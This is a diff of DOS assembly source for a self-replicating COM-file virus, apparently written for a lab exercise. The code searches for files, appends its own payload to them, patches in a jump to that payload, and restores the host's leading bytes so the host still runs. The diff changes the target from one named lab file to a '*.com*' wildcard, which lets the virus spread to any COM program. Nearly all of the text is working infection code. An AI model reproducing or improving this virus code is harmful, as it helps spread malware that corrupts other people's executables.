@@ -12,6 +12,21 @@ hardcode:
 
 code:
 
+    ; checking the indexing shift
+    mov ax, [bp + test1]
+
+    ; reverting first bytes
+    push bx
+    mov bx, 100h
+    mov al, [bp + offset leading_bytes[0]]
+    mov ah, [bp + offset leading_bytes[1]]
+    mov word ptr[bx], ax
+    mov bx, 102h
+    mov al, [bp + offset leading_bytes[2]]
+    mov ah, [bp + offset leading_bytes[3]]
+    mov word ptr[bx], ax
+    pop bx
+
     ; setting dta on file
     mov ah, 1ah
     lea dx, [bp + file]
@@ -26,6 +41,7 @@ code:
     lea dx, [bp + file.fname]
     mov ax, 3D02h
     int 21h
+    mov bx, ax ; file descriptor (ax) -> bx
 
     ; output infected filename
     mov al, '$'
@@ -35,33 +51,28 @@ code:
     mov ah, 09h
     int 21h
     pop dx
-    mov file.fname[12], 0
+    mov [bp + file.fname[12]], 0
 
     ; file error handling
     jnc file_err_skip
     lea dx, [bp + file_err_msg]
     mov ah, 09h
     int 21h
-    mov ah, 4ch
-    int 21h
+    
+    mov ax, 100h
+    jmp ax
 
 file_err_skip:
-
-    ; reverting first bytes
-    mov bx, 100h
-    mov ax,  leading_bytes[0]
-    mov word ptr[bx], ax
-    mov ax,  leading_bytes[2]
-    mov word ptr[bx], ax
 
     ; moving carret to the end to get the payload offset
     mov cx, 0
     mov dx, 0
-    mov bx, ax ; file descriptor (ax) -> bx
     mov ax, 4202h
     int 21h
     mov [bp + payload_offset], ax
-    add ax, 100h
+    mov [bp + jmp_length], ax
+    ; add ax, 100h
+    add ax, 1
     mov [bp + victim_bp], ax
 
     ; ; preparing payload addressation
@@ -95,8 +106,9 @@ file_err_skip:
     mov ah, 40h
     int 21h
     
-    mov ax, [bp + victim_bp] ; jmp offset
-    add ax, 100h ; com header
+    mov ax, [bp + jmp_length] ; jmp offset
+    sub ax, 3 ; jmp command size
+    ; add ax, 100h ; com header
     mov [bp + word_buffer], ax
     lea dx, [bp + word_buffer]
     mov cx, 2
@@ -116,7 +128,7 @@ file_err_skip:
     int 21h
 
     ; writing payload hardcode
-    mov [bp + byte_buffer], 0bdh
+    mov [bp + byte_buffer], 0bdh ; mov bp command
     lea dx, [bp + byte_buffer]
     mov cx, 1
     mov ah, 40h
@@ -124,27 +136,35 @@ file_err_skip:
     
     mov ax, [bp + victim_bp]
     mov [bp + word_buffer], ax
-    mov dx, bp + word_buffer
+    lea dx, [bp + word_buffer]
     mov cx, 2
     mov ah, 40h
     int 21h
 
+    mov [bp + byte_buffer], 08bh ; wtf
+    lea dx, [bp + byte_buffer]
+    mov cx, 1
+    mov ah, 40h
+    int 21h
+
     ; writing payload code
-    mov dx, bp + code
-    add dx, bp
-    mov cx, bp + offset harddata
+    lea dx, [bp + code]
+    add dx, 1
+    ; add dx, bp
+    mov cx, offset harddata
     sub cx, offset code
     mov ah, 40h
     int 21h
 
     ; writing payload harddata
-    mov dx, bp + leading_bytes
+    lea dx, [bp + leading_bytes]
     mov cx, 4
     mov ah, 40h
     int 21h
     
     ; writing payload data
-    mov dx, bp + offset data
+    mov dx, bp
+    add dx, offset data
     lea cx, afterall
     sub cx, offset data
     mov ah, 40h
@@ -153,10 +173,6 @@ file_err_skip:
     ; closing file
     mov ah, 3eh
     int 21h
-    ret
-
-    mov ah, 4ch
-    int 21h
 
     ; redirect to victim program
     mov ax, 100h
@@ -164,9 +180,11 @@ file_err_skip:
 
 harddata:
 
-    leading_bytes dd 0b4h, 4ch, 0cdh, 21h
+    leading_bytes db 0b4h, 4ch, 0cdh, 21h
 
 data:
+
+    test1 dw 0abcdh
     
     ; 13-byte string for filename
     Str13 struc
@@ -192,9 +210,12 @@ data:
     dword_buffer dd ?
     word_buffer dw ?
     byte_buffer db ?
+    
     payload_offset dw ?
     victim_bp dw ?
-    file_mask db 'lab3v.com', 0
+    jmp_length dw ?
+    
+    file_mask db '*.com*', 0
     file_err_msg db 'No any file to infect', 13, 10, '$'
 
 afterall:
